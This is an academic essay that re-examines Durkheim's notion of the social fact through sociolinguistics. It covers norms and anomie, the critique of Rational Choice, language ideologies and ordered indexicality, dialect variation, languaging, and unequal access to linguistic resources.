Emile Durkheim devoted his life to the self-conscious construction of sociology as a science, and by the end of his life, he had achieved that goal. In his view, scientific sociology was a necessity in fin-de-siècle France. Durkheim shared the widespread sense of discomfort of his compatriots, epitomized in the military defeat against German forces in 1870 leading both to the end of the second Empire and to the revolution of the Paris Commune. Society-as-we-knew-it appeared to be falling apart. People had become weak, decadent, hedonistic and individualistic, and a generation-long process of industrialization, with the growth of a large urban proletariat in mushrooming cities, had disrupted France’s national sociocultural cohesion, and hence had prejudiced its future as a strong nation. Sociology, for Durkheim, was one of the tools needed to reconstruct a sense of membership among the French, of a community that was characterized by specific and exceptional features – to be discovered by scientific sociology and to be spread throughout France by a new system of “moral education” (the title of his celebrated course of lectures: Durkheim 1961 [2002]). This sociology was, thus, aspirational and prescriptive, a sort of “ortho-sociology”; rather than to just describe what was there, Durkheim set out to convert factual description into normative prescription in view of constructing a society that, in his understanding, was not yet there.[7]
2.1 Norms and concepts
This normative-prescriptive aspect is a point we need to remember, for it explains the particular focus of Durkheim’s sociology, norms; or to be more precise: the secular moral order that should characterize the rational, industrial and science-based French society of the 3rd Republic. The existence of such an order – implicit and often invisible in everyday life – was what Durkheim posited as “the social fact” that made his sociology possible; and the vigorous promotion, spread and enforcement of this order was the nation-building task of the modern French state, via its education system. Eventually, this rational civic moral order should replace religion as the belief system underlying and organizing society, gradually becoming as “sacred” as, previously, religious beliefs. The latter were, according to Durkheim, veiled and misconceived understandings of the real, essential moral order:
“We must discover those moral forces that men, down to the present time, have conceived of only under the form of religious allegories. We must disengage them from their symbols, present them in their rational nakedness, so to speak, and find a way to make the child feel their reality without recourse to any mythological intermediary.” (Durkheim 1961 [2002]: 11).
Durkheim’s analogy of the secular moral order with the moral order propagated in religion would, in later stages of his career, push him towards profound engagements with religion as a social fact. For in both the secular and the religious moral order, he saw the same features at work: both were experienced and perceived as beyond the grasp and intention of individuals, and as compelling norms of social life. In the case of religion, they emanated from a divine force; in the case of social facts, society provided them; in both cases, individuals acquired them through extended interaction in their communities as well as through institutionalized forms of learning and education.
These features, then, formed the definition of his “social fact”. Social facts are forms of behavior and thought (1) that are “exterior to the individual” and (2) experienced by individuals as coercive, constraining and imperative rules, deviation of which would come at a price (see e.g. Durkheim 1895 [2010]: 100; discussion in Lukes 1973: 8-15). They are, in short, collective norms of which the individual has an acute awareness, and to which individuals feel they must submit. Here is one of the many formulations provided by Durkheim:
“A rule is not then a simple matter of habitual behavior; it is a way of acting that we do not feel free to alter according to taste. It is in some measure – and to the same extent that it is a rule – beyond personal preference. There is in it something that resists us, is beyond us”. (Durkheim 1961 [2002]: 28)
The religious analogies are plain: the social order is sacred in Durkheim’s eyes. Recall that the social fact, thus defined, was the object of sociology as designed by Durkheim; the two defining characteristics of social facts should set the new discipline apart from psychology (a science devoted to individual behavior and thought).[8] Durkheim soberly observed that people act differently when they are alone from when they are in the company of others. When alone, instincts, pre-social desires would regulate behavior (and would therefore be the terrain of psychological analysis); social behavior, by contrast, was regulated by “collective conscience” – what we could now call an “ideology” – and by a moral discipline pushing individuals to bring the extremes of their instincts under control so as to be acceptable in the eyes of others.[9] In that sense, the development of social behavior marks a transition from “absolute existence” (humans in their natural state) to “relative existence” (humans as social, in relation to others and to institutions), from an a-moral state to a moral state, and from a mode of solitary autarky to one of solidarity and labor division (cf. Lukes 1973: 125; many of these notions were already elaborated in Durkheim’s dissertation, De la Division du Travail social, 1893 [1967]).
The collective conscience, note, is made up of “collective representations” – things we would now call “concepts”, relatively fixed meaning frames. And while institutions such as state-sponsored education transmit, across generations, certain collective representations “typical” of the nation-state, such representations are acquired alongside more specific ones characterizing and organizing life in particular social groups (caste, class, family, profession, etc.). The norms that organize social life are, in other words, layered and scaled. Socialization, thus, proceeded both at the level of becoming a citizen of a (homogeneous) country, and at the level of becoming a member of (more diverse) specific social sub-groups. The function of both is the same: norms always presuppose “a certain disposition in the individual for a regular existence – a preference for regularity” (Durkheim 1961: 34). Social rules are, simply put, “limits to our natural inclinations” (id: 96).
Now, although Durkheim would underscore the fact that “man always lives in the midst of many groups”, his views on which specific groups we should think about differ from publication to publication, and even when he mentions groups, he does not necessarily devote much analysis to them. Moral Education specifies just three such groups: the family, the nation (or political group), and humanity (1961 [2002]: 73-74), for instance, and only the nation is elaborately discussed – not surprising in a book that aspired to reorganize national education in France. Elsewhere, he would profoundly examine professional groups and religious groups as well. In all, Durkheim had a strong preference for what we could call “thick” groups, groups in which people shared a lot of norms, values and “collective representations”, and as we shall see later, his influence has been pervasive in that respect.
2.2 Integration and anomie
Let us recall Durkheim’s motives for the development of a sociology. He was gravely concerned about the perceived loss of sociocultural cohesion in the France of his day. He believed he was witnessing the disintegration of an old social order, while a new one was not yet in place. Consequently, his sociology consistently addressed issues of sociocultural cohesion or integration: how did this rapidly changing society maintain a reasonable degree of cohesion? In De la Division du Travail Social, he pointed towards one answer: new forms of solidarity grounded in the emergence of new, smaller, professional groups were complementing older forms of solidarity grounded in “deep” sociocultural ties. And they did so by developing alternative moral orders and collective representations – the defining features of the “social” as we have seen earlier, and in that sense also the defining features of identifiable social groups. Members were integrated into such groups by subscribing to and adopting these defining features, by “enregistering” (we would now say) the moral codes that shaped such groups and held them together. In other words, integration is a factor of successful socialization of individuals into the moral orders of social groups, and social cohesion is an aggregate of such forms of integration.
One of the most interesting and productive concepts developed by Durkheim is that of anomie. Anomie describes a situation in which individuals reject available normative orders or cannot draw on them, either by absence of such orders, or because access to them is severely restricted. Anomie stands for “normlessness”. Durkheim discussed the concept elaborately in his Suicide (1897 [1951]), and he did so from the viewpoint of social cohesion. In a rapidly changing society where an old order is on its way out while a new order is under construction, he argued, numbers of people find themselves in a moral no-man’s land where the rules of the social game are unknown, unclear or in need of development. Anomie, we could say, is the concrete face of social disintegration and individual marginalization. And Durkheim saw his own rapidly transforming society as prone to anomie, since the robustness and homogeneity of the old social order (revolving around, for instance, widely shared religious norms and close family ties) had vanished while a new one (based, as we saw, on a sophisticated division of labor generating numerous new professional, integrated groups) was not yet fully developed. Individuals, consequently, would risk being poorly or incompletely socialized and at a loss finding out what it takes to do well. This moral no man’s land explained the high statistical incidence of suicide, and Durkheim provided a primarily social explanation for suicide.
With some qualifications, Durkheim saw anomie as something negative, a lack of a clear and widely shared moral social order; individuals caught in anomie are marginalized, deviants, outsiders. At the same time, he saw anomie as an inevitable feature of socio-historical change and, in that sense, as a constant feature of societies at any point in time – a fully integrated society was an aspiration rather than a reality, and at any moment in its historical development, societies would be characterized by old and new normative systems coexisting in a sometimes uncomfortable way. Yet, Durkheim failed to see the creative and productive potential of anomie – the ways in which anomie spawns alternative ways of social organization. His view of anomie can also be made more useful when it is understood not as a top-down phenomenon – from the ‘center’ of society towards its margins – but as a general relational phenomenon operating at all levels of social life in the form of (negative) normative judgments of one about another. The margins of society, seen from this more broadly scoped view, are spaces where alternative social orders are quite rigorously observed and policed – as Howard Becker (1963) famously demonstrated.
2.3 Durkheim’s impact and the challenge of Rational Choice
I have deliberately been selective here, focusing on elements from Durkheim’s work that offer immediate possibilities for critical re-evaluation in view of sociolinguistic evidence. Let me summarize and reformulate these elements in a series of related propositions.
There is a set of human forms of behavior that are collective, in the sense that they cannot be reduced to individual agency or intention. They are acquired socially, through socialization and education processes, in a variety of groups. They have a sui generis reality which cannot be explained by explaining individuals’ enactments.
These forms of behavior must be seen as governed by sets of sanctioned norms, or ideologies, and the character of these norms is moral. Social behavior is moral-normative.
These sets of norms characterize social groups, notably “thick” groups such as those of the nation, class, caste, family, profession, religion. We always live in a plurality of such groups.
These sets of norms are the key to social cohesion and integration: people who submit to them will be perceived as “normal” members of their social groups, while people deviating from them will be confronted by anomie and risk being seen as outcasts.
In a variety of formulations, these four propositions can be found throughout twentieth-century sociology (and beyond). Durkheim’s sociology was, like that of e.g. Dewey and Bourdieu but unlike that of e.g. Weber (Gerth & Mills 1970: 57) first and foremost a sociology of communities and of social cohesion, and it opened several areas of exploration that became foundational for twentieth-century social sciences. These areas ranged from the study of ethnoclassification and ethnoscience (through his work with Marcel Mauss), collective memory (through his student Maurice Halbwachs), labor organization and labor institutions (influencing, to name just a few, Everett C. Hughes, Herbert Blumer and John Kenneth Galbraith), socialization (influencing e.g. Jean Piaget), religion, cultural symbols and ritual (influencing e.g. Victor Turner and Erving Goffman), and several others.
It was Talcott Parsons who turned the priorities of Durkheim’s program into the systematic theory to which Glyn Williams took exception, in the effort significantly simplifying some of the most interesting but often unstable aspects of Durkheim’s work – notably the relationship between “society” and “social groups” and the place of individual agency in society.[10] Parson’s sociology, as we know, focused on integration at the level of “society” (e.g. Parsons 2007). Societies would remain integrated because of the widespread acceptance of specific and relatively enduring sets of values, while norms characterized smaller social groups. Norms could differ from the dominant values, of course, they could even run counter to these values; but they were distinctly “lighter” than values.[11] Thus, in a text written in 1964 on US youth culture (at that time perceived as rebellious and increasingly deviant), Parsons confidently concluded that
“American society in a sense appears to be running its course. We find no cogent evidence of a major change in the essential patterns of its governing values.” (Parsons 1964: 181)
In other words, the long-haired, pot-smoking and anti-Vietnam young rebels of the early 1960s were still good and decent Americans, and their shocking behavior did not shake the foundations of the American mode of integration. Four years later, such an argument would prove to be hard to sustain, and not just in the US (Elbaum 2002).[12]
As I said above, Durkheim was very much a sociologist of communities, of the collective dimension of social life. The most radical challenge to this came from what is now known as Rational Choice (Theory) (Green & Shapiro 1994; Adamae 2003). Rational Choice is an outgrowth of Methodological Individualism, something Max Weber introduced as a doctrine in the social sciences (and was taken further by e.g. Hayek and Popper). Simply put, Methodological Individualism is the theory complex in which every human activity is in fine reduced to individual interests, intentions, motives, concerns and decisions, because (it is argued) such observable individual levels of subjectivity in action, even if eminently social, are the only ones available to the analyst (Heath 2015). And Rational Choice can best be seen as a radicalization of the “individualism” in this: human action, in Rational Choice, is driven by one motive: the maximization of individual “profit” (material as well as symbolic) and proceeds by means of calculated, intentional and rational decisions by individuals (“choice”). Since Durkheim’s moral order crucially depended on the suppression (or “moderation”) of individual interests and preferences – egoism is typically seen as “immoral” – the theoretical dichotomy could not be sharper.[13]
Rational choice, in that sense, is a fundamental denial of Durkheim’s “social fact”. Even more: it is a lock-stock-and-barrel denial of the entire Durkheimian sociological imagination, for “there is no such thing as society” (to quote Margaret Thatcher’s slogan). In Kenneth Arrow’s (1951) famous view, any form of collective (rational) choice is just impossible. Arrow, “proved” this in his so-called “Impossibility Theorem”, quite incredibly by means of intricate mathematical argument – and mathematics reshaped (and replaced) field observation-based sociology as the privileged source of knowledge on humans and their social practices (Adamae 2003: 102-116; cf. Blommaert 2016a). To the disbelief of empirical sociologists such as Everett C. Hughes, if certain social practices were ruled mathematically “impossible”, it was assumed that their occurrence in the real world was exceptional or accidental (cf. Hughes 1971 [2009]: xix, 348-354).
Rational Choice never made a real inroad into Sociolinguistics; but it largely dominates several social-scientific and humanities disciplines, most notably Economics (cf. Thaler 2015).[14] Revisiting and revising Durkheim’s social fact from the perspective of contemporary sociolinguistics – the exercise I stall embark on in a moment – therefore implies a rejection of Rational Choice. A good reason for this is that in the more radical varieties of Rational Choice, people never seem to communicate, or to communicate only in dyadic logical dialogue when they are allowed to.
Sociolinguistics and the social fact: Avec Durkheim
So let us first establish this: people do communicate; they communicate all the time, in highly diverse and complex modes, often with more than one interlocutor, and not always logically, economically or rationally; it is through interaction that they are recognized as “social”, as a “subject”, and as producers of ideas. Affirming this is, of course, of an extraordinary triviality. But this trivium has been denied and neglected in tons of sociological and other social-scientific work, turning it not in a trivial truism but into a hard-fought methodological principle. Establishing that principle means affirming the very possibility of a socio-linguistics. And I think we have pretty decent empirical back-up for this principle and, thence, for the possibility of sociolinguistics. So let us show some of that evidence in what follows.
I repeat what I mentioned earlier: while almost every major sociologist would emphasize (or at least mention) interaction as a given, detailed attention to interaction has never really been part of the sociological mainstream. Interaction was paid lip service to, and communication is often seen as a set of rudimentary transmission practices not worthy of study in its own right – something so elementary that it belongs to the décor in which real social action is played out and does not demand further examination.[15] Blumer, defining the methodological position of symbolic interactionism as it was being kept in the margins of the sociology of his time, lamented (1969: 7):
“a society consists of individuals interacting with one another. The activities of the members occur predominantly in response to one another or in relation to one another. Even though this is recognized almost universally in definitions of human society, social interaction is usually taken for granted and treated as having little, if any, significance in its own right.”
Durkheim was no exception. And this, remarkably, led to generations of sociologists overlooking what is potentially the most self-evident “social fact”. Let me sketch some aspects of it, and start with the most general one.
3.1 Language as a normative collective system: ordered indexicality
People can only communicate with others when they share and deploy different forms of “grammar” – conventionalized normative patterns ordering the potential mess of symbols we call language, ensuring that we “make sense” to each other. This simple observation should be sufficient to establish it as a Durkheimian social fact pur sang.[16] But let me elaborate this – begging the reader for tolerance for the highly sketchy summary of complex histories of linguistic thought in what follows.
The different forms of grammar can – roughly – be divided into grammars of form and grammars of usage, and usually the term “grammar” is reserved for the former: the fact that the formal, morphosyntactic organization of linguistic expressions is governed by language-specific (i.e. non-individual) rules, compliance with which displays some degree of flexibility but is overall quite strict and relatively stable and enduring. Description of these formal rules became “linguistics”, and their relatively stable and enduring character became the key element in identifying separate “languages” (cf. Silverstein 1977; Irvine 2001; Bauman & Briggs 2003; Blommaert 2013; see Agha 2007a:222 for a concise discussion). As for grammars of usage, they gradually became a separate domain of study (called “Pragmatics”) through the work of language philosophers such as Austin (1962), Grice (1975) and Searle (1969) (cf. Verschueren 1999). Here, too, relatively stable and enduring rules were detected, although the overlap between such rules and separate “languages” was less outspoken. Rules of politeness, for instance, appeared to be connected, rather, to social and cultural groups than to the actual “languages” they use, and were even seen as potentially universal (Brown & Levinson 1987; for a critical appraisal see Eelen 2001). A generation of anthropologists had, in the meantime, provided mountains of literature on the sociocultural embedding of language in specific (often “ethnic” or “tribal”) communities (see Hymes 1964 for a survey), while symbolic-interactionist sociologists in the US had started exploring the social-scientific significance of everyday patterns of social interaction in their own social environments (e.g. Goffman 1959; Garfinkel 1967; Blumer 1969).
The eminently social fact of grammar, remarkably, became individualized as soon as universals became the ambition of linguistic theory in the wake of Noam Chomsky’s epochal reformulation of linguistic as a science of “competence” – the mentally structured capacity to generate grammatically well-formed sentences (e.g. Chomsky 1965). Chomsky announced that the focus on competence meant that linguists should be concerned with an “ideal” speaker/hearer operating outside of any form of real communicative situation; and this ideal speaker became an individual speaker whose “language” existed, in universal ways and (contrary to Saussure’s view) perfectly, in his/her individual brain (see Katz 1972 for an excellent example and Cicourel 1973, chapters 3, 4, for a critique). Methodological individualism, thus, entered the science of language through the detour of psychologism, and social and cultural norms were replaced by mental operations unaffected by (socially and culturally contextualized) “performance”. Language had become an a-social fact.
Modern sociolinguistics was a reaction to that; and from its very beginnings, work in sociolinguistics would struggle to re-emphasize language as a social fact. Reaching back to the oeuvres of Sapir and Whorf, the abstract language designated as the object of linguistics was countered by situated, contextualized “speech” and such speech had to be understood in terms of a dialectics of language and social life, lodged in a “speech community” (Hymes 1966; 1972; 1980; Gumperz 1968; 1982). And apart from a (possibly) mentally hardwired and universal grammatical “competence” – the linguistic system – one should also consider the group-specific and culturally-relative communicative competence – the sociolinguistic system (Hymes 1992). Communicative competence, note, referred to knowledge of the sociocultural norms of language and the capacity to deploy them adequately in a variety of social circumstances. The norms of language, thus, were defined as sociocultural constructs in a theoretical frame emphasizing action; and Michael Silverstein (again drawing on Whorf) put a gloss on them: “language ideologies” (Silverstein 1979).
I shall be forgiven for this breathless rush through half a century of intellectually development, for I have arrived now where I wanted to arrive. The concept of language ideologies, which rose to prominence and became a unifying focus in the 1990s (Kroskrity, Schieffelin & Woolard 1992; see Blommaert 2006a for a review), offered a comprehensive framework for re-establishing language as a social fact, in nearly all aspects. The central idea proved extraordinarily productive: language is used on the basis of socioculturally grounded conventions dialogically organizing its production and understanding; the empirical basis for such ideologies were concrete “indexicals”, i.e. aspects of communicative action that pointed in nonrandom ways to salient, context-specific sociocultural meaning reservoirs, and ultimately to social structure (see Agha 2007b; also De Fina et al 2006; Cicourel 1973 is a precursor). Indexicals, thus, pointed to conventionalized and therefore presupposed histories of meaningful usage (or “models”, Gal 2016: 119) and precipitated them into new moments of deployment with active, responsive interlocutors. In Silverstein’s words (1992: 315):
“Now any indexical process, wherein signs point to a presupposed context in which they occur (i.e. have occurred) or to an entailed potential context in which they occur (i.e. will have occurred), depends on some metapragmatic function to achieve a measure of determinacy. It turns out that the crucial position of ideologies of semiosis is in constituting such a mediating metapragmatics, giving parties an idea of determinate contextualization for indexicals, presupposable as shared according to interested positions or perspectives to follow upon some social fact like group membership, condition in society, achieved commonality of interests, etc. Ideology construes indexicality. In so doing ideology inevitably biases its metapragmatic “take” so as to create another potential order of effective indexicality that bears what we can appreciate sometimes as a truly ironic relation to the first.”
This principle could be applied to the formal “grammar” of language, which appeared subject to strong language-ideological effects (e.g. Silverstein 1979; Errington 1988; Irvine & Gal 2000); to the learning of language norms in socialization processes (e.g. Schieffelin & Ochs 1986); to the use of specific “registers” governing concrete sociocultural domains of speech and subject to processes of “enregisterment” (e.g. Agha 2005; 2007b); to patterns of everyday narratives (De Fina et al 2006); to lay and institutionalized concepts of language, including sociolinguistic hierarchies and attributed speaker identities (e.g. Silverstein 1996, 1998; Agha 2003) and the politics of language at nation-state level and in more specific institutional contexts (e.g. Jaffe 1999; Blommaert 1999; Philips 2000; Haviland 2003); on intertextual processes of meaning-making and resemiotization (e.g. Silverstein & Urban 1996); on complex contemporary forms of meaning-and-identity making involving “codeswitching” (e.g. Rampton 1995; 2006). En route, a large number of crucial concepts in the study of language were redefined: language itself, speech community, genre, style (Gal 2016). And so forth: the range of themes, concepts and domains that were profoundly reshaped by the conceptual development of language ideologies is extensive.
The truly fundamental theoretical and methodological impact of language ideologies, in view of the exercise I undertake here, is that it has given us an extraordinarily precise view of “norms” (and their cognates “values” and “collective representations”). Norms, we now see, are language-ideological phenomena produced and enacted in communicative action. They are, more precisely, ordered indexicalities: sets of indexicals organized in relation to each other, with some of them being “emblematic” of the meaning effects they generate – a sort of register “shibboleth” effect, as when someone starts a sentence with “oh dear” versus “fuck” (cf. Silverstein 2003; Agha 2005, 2007; Blommaert 2005), or shifts into a mock accent so as to project an evaluated identity on someone else (e.g. Hill 2001; Rampton 2006). The fundamentally normative and interpreted character of social relations, thus, becomes clear: whenever we interact with others, we produce not just the kinds of denotational meanings one finds in a dictionary, but we produce evaluative meanings, in which the words, actions and identities of all the participants are fixed and given (sociocultural) value. And in so doing we produce, moment by moment, “culture” and “society”, as well as “identity” and “meaning”. None of these concepts can be detached from interaction – “language and culture”, for instance, have merged into the interactional production of indexical order (Silverstein 2004).
Echoes of Bakhtin and Goffman are evident here: language-ideologies can in many ways be seen as an extreme methodological refinement of the general ideas articulated by Bakhtin (1981, 1986) and Goffman (1971, 1974). Bakhtin’s sociohistorical theory of literary form has now been extended into the entire field of language in society, and given far more analytical purchase and precision; while the micro-orders of social conduct described by Goffman can now also be reformulated in a more systematic and generalizable way. I shall come back to the continued relevance of both authors further on; in the case of Goffman, we shall see that, in a wider sense, the program of symbolic interactionism (and to some extent, of ethnomethodology) is coming back with a vengeance (cf. Blumer 1969; Cicourel 1973; Garfinkel 2002). In addition, and combining Bakhtin with Goffman, ordered indexicalities presuppose, and necessitate, a dialogical conception of meaning-making that stretches over the entire range of behaviors deployed in what we call “interaction” or “communication”. Whenever we communicate, we keep an eye on the other and adjust our communicative behavior to an anticipated uptake from our interlocutors. In contrast to what Rational Choice suggest, we are quite altruistic and cooperative in communication, and we are happy and eager to accommodate the other in our own language use – as shown whenever we revert to a kind of pidgin English when an obviously confused tourist from far away ask us for directions. Our communicative behavior is regulated by the fact that it is organized together with others.[17]
Three final remarks are in order.
Orders of indexicality are obviously collective, social phenomena. I qualified them as “nonrandom” on a couple of occasions already, and this is vital because any form of understanding requires recognizability in terms of a specific set of ordered indexicals. An interaction opened with “Excuse me, sir” versus one opened with “hey, you!” is likely to be a different interaction (probably a difference captured by “polite” versus “impolite”), and recognition of this difference can only occur when the participants share the language-ideological valuations of these indexicals. And they do. A recent study by Silverstein (2015) on public (online) discussions of “New York accent” showed remarkable similarities in several categories of valuations articulated by participants, something that corroborates Penny Eckert’s (2008; 2012) notion of “indexical fields”. Linguistic variation, it now appears, is subject to powerful collective language-ideological forces (“we have come to see variation as a more robust and dynamic indexical system”, Eckert 2015: 43; also Rampton 2006, 2016a). Section 3.2 will return to this.
People display an outspoken tendency to create norms whenever they are absent or unclearly scripted, and new communication technologies provide us with plenty of examples of that. The extremely rapid development of new social media platforms and apps, one can say, presents their users with a situation of “anomie” each time they engage with such novelties. And whereas common wisdom would often qualify mobile phone texting codes and Facebook interactions as “anything goes” because the carefully indoctrinated school standards of language and script appear to be violated continuously, a more concentrated analysis shows that even such apparently open, highly diverse, free and unscripted communicative spaces are very rapidly filled with ad-hoc (and rapidly solidified) norms, defining modes of interaction, genres and styles, and subject to sometimes rigorous policing; these new norms can and do function as tools for evading or subverting imposed, top-down rules when existing rules are experienced as oppressive (e.g. Varis & Wang 2011; Wang, Juffermans & Du 2012; Blommaert 2012; Leppänen & Elo 2016; Du 2016; Staehr 2017). As said before, anomie may be defined as a space without norms; at the same time, it is also a space where new norms are invited, demanded and manufactured – a creative space in which “the social”, as grounded in the sharedness of sets of norms, is instantly shaped. To rephrase this with reference to Rational Choice: we see in this phenomenon of instant, grassroots norm-creation how people continuously surrender their individual choice and freedom to joint patterns of regulation and policing. Because they do not want to get stuck talking to just themselves, one can imagine.
While ordered indexicals organize and generate “meaning”, such meanings are not just “rational”, i.e. denotational, but also, and simultaneously, aesthetic and dramatic. In fact, when people communicate, they perform a bundle of functions: epistemic, affective, poetic, performative (Hymes 1980; Haviland 1989; Bauman & Briggs 1990). And it is this bundle – not just its epistemic aspect – that turns communication into something that satisfies higher-order social and cultural demands (Hymes 1966, 1996; Silverstein 1985, 1997, 2004; Blommaert 2006b, 2015c). We convince others not just by the pureness and truth-conditional excellence of our argument, but even more by the stylistic-narrative performance in which it is cast and by the evaluative key in which we frame it; and we pay meticulous attention to all of this while we build our argument. In the view of Charles Goodwin (2007), there is something inherently moral in epistemic practices, since the latter demand a tightly organized set of moves within a chosen participant framework, rupture of which is seen as a moral as well as an epistemic issue (cf. also Goodwin 1994). This simple observation blows out of the water any theory in which human communication is reduced to the rational exchange of pure (and perfectly retrievable) meanings. To put it somewhat crudely and in folksy terms: human rationality is very much tied up with, in practice even indistinguishable from, human irrationality – with emotion, morality and aesthetics. We are very subjective when we believe we are objective and can get quite emotional when we discuss “the facts”.[18]
I have spent a lot of space discussing this first element – language as a normative collective system, now understood through the conceptual instruments of language ideologies – for it underlies several of the points that follow. I can treat these points somewhat more concisely now.
3.2 Language variation: dialects, accents and languaging
I already mentioned above (pace Eckert) that language variation is now seen as an indexical system of “distinction”. Language is the great diversifier: even the smallest feature can serve as an emblem of fundamental identity difference (Rampton 1995; Blommaert 2015b). But let us start where we have to start: with the features that index such distinction, language variation itself.
Recall the elements that Durkheim identified as defining the social fact: social facts were (a) phenomena that transcended the control of the individual and (b) had a compelling, normative effect on individuals. Now consider a straightforward case: all over the world, people learn a language we call English; they do so, in formal education, on the basis of a corpus of teaching materials that are amazingly similar (in fact, they can be seen as standardized industrial mass products). Yet all over the world, and in spite of the near-uniform input, people speak English with an accent. These accents are clearly identifiable: few would not be able to tell the difference between, say, an “American” accent and a “French” one, and many would be able to distinguish an “Indian” accent from a “Nigerian” one. In fact, such distinctions have led to the development of a branch of Applied Linguistics called “World Englishes” (e.g. Bhatt 2001; also Pennycook 2007; Seargeant 2009; Mufwene 2010), where different regional realizations of English are no longer seen as deviations from “standard” English but as bona fide language varieties in their own right, often with names such as “Hinglish” (Hindi-English: Kothari & Snell 2011) or more generically “country name + English”, as in “Brunei English”. The range of “typical” features, for instance in Brunei English, is extensive and ranges from phonetics and morphosyntax to discursive and lexical differences. The explanations for such differences are usually sought in influences from language contact with “native” language substrates, the specific history of English in the region, the local or region language policies and the education system (Deterding & Sharbawi 2013). In the case of Hinglish, apart from these factors, the influence and prestige of a powerful Hindi-language popular culture is also noted (Kothari 2011). (Observe that we are addressing a globalization phenomenon here, and I shall return to this in later parts of this text).
The fact, however, remains the same. People growing up and living in specific regions of the world acquire features of speech that are distinctly, and identifiably, regional – “from there”. These features – accents – are extraordinarily powerful identity shibboleths; in fact the word “shibboleth” itself refers to a biblical story in which accent in speech was used to distinguished allies from enemies (and to kill the latter, appropriately identified). And getting rid of an acquired accent is quite a slow, difficult and sometimes painful job, for which, in the meantime, a branch of specialized therapists and providers has emerged (cf. Blommaert 2008a; Silverstein 2015). Variation in speech, we can see, is not something one typically chooses – it is acquired through socialization processes, i.e. through a shared history in a community in which the fine distinctions of speech are learned and embodied. Those are phenomena that transcend the individual, no one really owns them.
As for their compelling, normative effects, we must keep earlier remarks in mind and now turn to a venerable branch of sociolinguistics: social dialectology in the tradition of Peter Trudgill.[19] Drawing on Britain & Cheshire (eds. 2003), several points are worth noting.
Collective identity appears to be the main driver guiding the dynamics of dialect. More specifically, dialect, however defined, is a shibboleth for regional identity, i.e. a recognizable identity shared by people inhabiting a particular region, currently or in the past; dialect indexes the local and regional (also Johnstone 2010; Silverstein 2015).
This also pertains to innovation and change: they depend strongly on degrees of social integration. The better people are integrated in the community, the more they will contribute to innovation in dialect, due to the tendency to index specific subgroups within that community. Social isolation – as with e.g. spatially isolated “outliers” in poorly populated areas – slows down the patterns of change in dialects (Britain 2003).
“Dialect leveling” – a well-known feature in dialectology, in which dialects appear to develop in a more convergent way, depends on social factors as well: speech accommodation between speakers of different dialect backgrounds (Kerswill 2003).
The tendency to index specific subgroups through dialect innovation highlights (a) the heterogeneity of dialect “speech communities”; and (b) the importance of “loose social networks” (Watts 2003; also Silverstein 2016) in language change.
Throughout all of this, “social categories are (…) seen as ideologically-driven processes” (Britain & Cheshire 2003: 4): the dynamics of dialect change is governed by language-ideological attributions – the normative and identity-projecting phenomena discussed in the previous section (also Rampton 2009; Gal 2016).
The latter can be observed in yet another dimension of language change: languaging, the extraordinarily creative mixing and blending of linguistic and expressive resources typical of sociolinguistically highly complex environments (Jörgensen 2008; Creese & Blackledge 2010; Jörgensen et al 2011; Juffermans 2015; Madsen et al 2016; Blommaert & Rampton 2016). While languaging, at first sight, appears like unregulated bricolage or mashup business, a kind of communicative anomie (and is often so perceived by those in charge of guarding the gates of language correctness), a closer look reveals a tremendous level of structuring, all of it governed language-ideologically by delicate shifts in (identity) “footing”, alignment between speakers and changes in the participant framework. Needless to say that current social media usage displays a phenomenal amount of such forms of languaging in new forms of graphic practice (e.g. Tagliamonte 2015; Du 2016).
The bricolage can, in effect, reveal differences between locally constructed and discernible “varieties” (Kailoglou 2015; Madsen 2017; also Rampton 2011), and can be a powerful instrument for “styling” specific identities – ironically, ritually, playfully, or quite seriously (Rampton 1995; Coupland 2007, 2015; Cutler 2009). The more serious forms of styling may revolve around highly ritualized minimal displays of a “heritage language”, with tremendous identity-establishing effects (e.g. Moore 2017). And “quite seriously” can also mean “making money”, of course: the commodification of language variation in new economic sectors – think of tourism, marketing and call centers as examples – has turned sociolinguistics into the profitable exchange of more than just symbolic capital (Heller 2010; Jaworski & Thurlow 2010; Blommaert 2010; Kelly-Holmes 2010; Woydack 2017).
3.3 Inequality, voice, repertoire
In discussing languaging, I already pointed to the linguistic and expressive resources that people use in such complex forms of discursive work. Such resources are, of course, not evenly distributed in any society, and the reasons for this are social.[20] Hymes (1996: 26-27) stated this problem clearly: while language obviously offers a pool of opportunities to people, it simultaneously acts as a constraint; it is a human social treasure trove as well as a human social problem, since no single person knows all of a language and meeting the limits of what we can communicate is an acutely frustrating social experience for all of us. Throughout life, we continuously acquire new sets of resources while we shed older, obsolete ones; and in its most general sense, we are always constrained by what is communicable and what is not – we often have no words for what needs to be expressed.[21] But let me focus on two specific elements by way of illustration: (1) access to specific register and genre resources and (2) access to specific contexts for communication.
In general, and contrary to the suggestion of the “ideal” (or “native”) speaker/hearer, no real human being has access to all the resources that circulate socially, for several reasons. There can be institutional barriers reserving “elite” resources for a small group of people, creating effective hierarchical patterns of access to what Bourdieu (1982) called “legitimate language” – and access to “standard” English in large parts of the world is a case in point (Park & Wee 2012; Blommaert 2010, 2014). People have easy access to spoken vernacular varieties of English widespread in global popular culture and open to informal learning – which is why words such as “fuck” and “shit” occur almost everywhere – while literacy-based standard varieties are far more difficult (and expensive) to obtain, and specialized registers such as legal-bureaucratic, literary or academic varieties even more so, since they demand access to effectively policed formal learning channels and “members only” communities of users. Thus, illiterate people are likely never to produce written discourse, and not because of choice but because of social-institutional structural reasons. And there are many “misunderstandings” that are grounded not in an individual’s poor choices of words but in an asymmetrical degree of communicative competence between speakers (Gumperz 1982 is a classic; also Roberts 2016). Processes of access restriction are not necessarily “institutional” though: similar forms of gatekeeping occur almost everywhere. Howard Becker’s (1963) Outsiders described how “marginal” social groups such as marihuana smoking jazz musicians also deploy tactics of selection and exclusion through specific modes of talk distinguishing “those in the know” from newcomers or ignorant “outsiders”. A lot of the literature on styling and languaging reviewed earlier addresses exactly such small peer-group identity dynamics in which group-specific, exclusive, enregistered phonological, morphosyntactic, lexical and genre features are made emblematic of membership and eligibility (cf. Silverstein 2006; Blackledge & Creese 2016).
